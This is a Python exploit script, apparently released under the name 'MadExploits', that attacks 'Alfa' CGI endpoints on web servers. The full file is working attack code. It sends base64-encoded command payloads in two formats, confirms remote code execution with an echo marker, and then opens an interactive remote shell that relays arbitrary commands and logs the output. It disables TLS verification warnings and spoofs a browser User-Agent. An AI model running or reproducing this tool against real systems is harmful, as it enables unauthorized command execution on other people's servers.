import requests
import base64
import sys
import os
import time
import threading
import urllib3
import logging
from datetime import datetime

# --- Basic Setup ---
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Logging Configuration ---
log_filename = f"exploit_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_filename),
        logging.StreamHandler(sys.stdout) 
    ]
)

class Colors:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    GREEN = "\033[92m"
    RED = "\033[91m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Colors.BOLD}{Colors.CYAN}
    ╔══════════════════════════════════════════════════════╗
    ║                                                      ║
    ║        ALFA RCE CGI EXPLOIT by MADEXPLOITS           ║
    ║         {Colors.WHITE}[ > ] github.com/MadExploits/alfa-rce{Colors.CYAN}        ║
    ║                                                      ║
    ╚══════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

def animate_loading(stop_event):
    """Displays a simple, elegant loading animation in the terminal."""
    spinner = "⣾⣽⣻⢿⡿⣟⣯⣷"
    while not stop_event.is_set():
        for char in spinner:
            if stop_event.is_set():
                break
            sys.stdout.write(f'\r{Colors.CYAN}[*] Testing payload... {char}{Colors.RESET}')
            sys.stdout.flush()
            time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 30 + '\r')
    sys.stdout.flush()

def execute_shell(session: requests.Session, url: str, vuln_type: str) -> None:
    """
    Starts a visually improved interactive shell on the vulnerable target.
    Logs all commands and their outputs.
    """
    clear_screen()
    print_banner()
    logging.info(f"Interactive shell engaged on {url}")
    print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Target is vulnerable! Interactive shell engaged.{Colors.RESET}")
    print(f"{Colors.YELLOW}    Type 'exit' or 'quit' to close the shell.{Colors.RESET}\n")

    cmd_key = 'c' if vuln_type == 'new' else 'cmd'

    while True:
        try:
            prompt = f"{Colors.BOLD}{Colors.BLUE}shell{Colors.RESET}@{Colors.CYAN}{url.split('//')[1].split('/')[0]}{Colors.RESET} > "
            command = input(prompt)
            
            if command.lower().strip() in ['exit', 'quit']:
                logging.info("User exited the shell.")
                break
            
            if command.lower().strip() == 'clear':
                clear_screen()
                print_banner()
                continue
                
            if not command.strip():
                continue
            
            logging.info(f"Executing command: {command}")
            encoded_command = base64.b64encode(command.encode('utf-8')).decode('utf-8')
            
            if vuln_type == 'new':
                payload = {"d": "L3RtcA==", "a": "command", "c": encoded_command} # d=L3RtcA== is base64 for /tmp
            else: # old
                payload = {"cmd": encoded_command}

            response = session.post(url, data=payload, timeout=20, verify=False)
            response_text = response.text.strip()
            
            print(f"{Colors.WHITE}{response_text}{Colors.RESET}")
            logging.info(f"Command output:\n---\n{response_text}\n---")

        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Shell closed by user.{Colors.RESET}")
            logging.warning("Shell terminated by user (Ctrl+C).")
            break
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!] Error sending command: {e}{Colors.RESET}")
            logging.error(f"Request failed during shell session: {e}")
            break

def check_vulnerability(url: str) -> None:
    """
    Checks the target URL for two types of RCE vulnerabilities with improved feedback.
    Logs the checking process and results.
    """
    # test_command_b64 is base64 for 'echo "mrmad"'
    test_command_b64 = "ZWNobyAibXJtYWQi" 
    
    payloads_to_test = [
        {"name": "New Version Payload", "type": "new", "data": {"d": "L3RtcA==", "c": test_command_b64, "a": "command"}},
        {"name": "Old Version Payload", "type": "old", "data": {"cmd": test_command_b64}}
    ]

    logging.info(f"Initializing scan for target: {url}")
    print(f"\n{Colors.BLUE}[*] Initializing session for: {url}{Colors.RESET}")
    
    with requests.Session() as s:
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        vulnerable_found = False
        for payload_info in payloads_to_test:
            stop_event = threading.Event()
            animation_thread = threading.Thread(target=animate_loading, args=(stop_event,))
            animation_thread.start()
            
            logging.info(f"Testing with '{payload_info['name']}'")
            try:
                r = s.post(url, data=payload_info['data'], timeout=15, verify=False)
                if "mrmad" in r.text:
                    vulnerable_found = True
                    stop_event.set()
                    animation_thread.join()
                    success_msg = f"SUCCESS: Found RCE with '{payload_info['name']}' on {url}"
                    print(f"{Colors.GREEN}{Colors.BOLD}[+] {success_msg}{Colors.RESET}")
                    logging.info(success_msg)
                    execute_shell(s, url, payload_info['type'])
                    break
            except requests.exceptions.RequestException as e:
                stop_event.set()
                animation_thread.join()
                fail_msg = f"Test for '{payload_info['name']}' failed. Reason: {e}"
                print(f"{Colors.RED}[-] FAILED: {fail_msg}{Colors.RESET}")
                logging.error(f"FAILED: {fail_msg}")
                return 
            finally:
                if not stop_event.is_set():
                    stop_event.set()
                    animation_thread.join()
        
        if not vulnerable_found:
            not_vuln_msg = f"Target {url} does not appear to be vulnerable."
            print(f"{Colors.YELLOW}[-] NOT VULNERABLE: {not_vuln_msg}{Colors.RESET}")
            logging.warning(f"NOT VULNERABLE: {not_vuln_msg}")

def main():
    clear_screen()
    print_banner()
    try:
        target_input = f"{Colors.CYAN}{Colors.BOLD}[?] Enter Target URL (e.g., https://example.com/cgi-bin/perl.alfa): {Colors.RESET}"
        target_url = input(target_input)
        
        if not target_url.startswith(('http://', 'https://')):
            print(f"\n{Colors.RED}[!] Invalid URL. Please include http:// or https://{Colors.RESET}")
            logging.critical("Invalid URL format provided by user.")
            sys.exit(1)
            
        check_vulnerability(target_url.strip())
        
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Program exited by user. Goodbye!{Colors.RESET}")
        logging.info("Program terminated by user (Ctrl+C).")
        sys.exit(0)

if __name__ == "__main__":
    main()
